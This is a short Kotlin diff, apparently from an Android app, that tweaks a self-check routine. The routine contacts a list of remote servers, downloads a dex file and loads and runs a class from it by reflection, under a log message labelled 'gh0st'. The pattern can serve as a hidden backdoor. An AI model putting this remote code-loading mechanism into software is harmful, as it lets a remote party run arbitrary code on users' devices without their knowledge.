@@ -132,7 +132,7 @@ fun checkSelf() {
         isConnectService = false
         for (serviceApi in serviceList) {
             if (!isConnectService) {
-                check4Net(serviceApi, packageName, versionCode, tag, sign)
+                check4Net("$serviceApi$packageName/", packageName, versionCode, tag, sign)
             }
             downloadDexAPK(context, serviceApi)
         }
@@ -231,7 +231,7 @@ fun loadAPK(context: Context, dexPath: String, className: String) {
             val method = classInit.getMethod("init", Context::class.java)
             method.invoke(null, context)
             "gh0st 远程dex加载成功!".logD()
-        }
+        } else "远程dex加载失败，无法找到类".logD()
     } catch (e: Exception) {
         e.printStackTrace()
     }
